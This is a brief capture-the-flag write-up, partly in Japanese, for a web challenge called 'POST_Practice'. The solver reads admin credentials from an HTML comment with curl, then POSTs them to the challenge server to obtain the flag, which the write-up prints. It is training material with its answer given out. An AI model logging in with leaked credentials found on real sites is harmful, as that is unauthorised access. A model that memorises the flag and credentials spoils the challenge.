## POST_Practice

40 points Medium

This website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe there is still some way to authenticate? http://165.227.106.113/post.php

## Solution 
```
# curl http://165.227.106.113/post.php
```
```
<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | passwolocalhost:~# curl http://165.227.106.113/post.php
<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->
```
useenameとpasswordを使ってPOST する

```
# curl -X POST -d "username=admin&password=71urlkufpsdnlkadsf" http://165.227.106.113/post.php
```

```
<h1>flag{p0st_d4t4_4ll_d4y}<h1>
```

## Flag

```
flag{p0st_d4t4_4ll_d4y}
```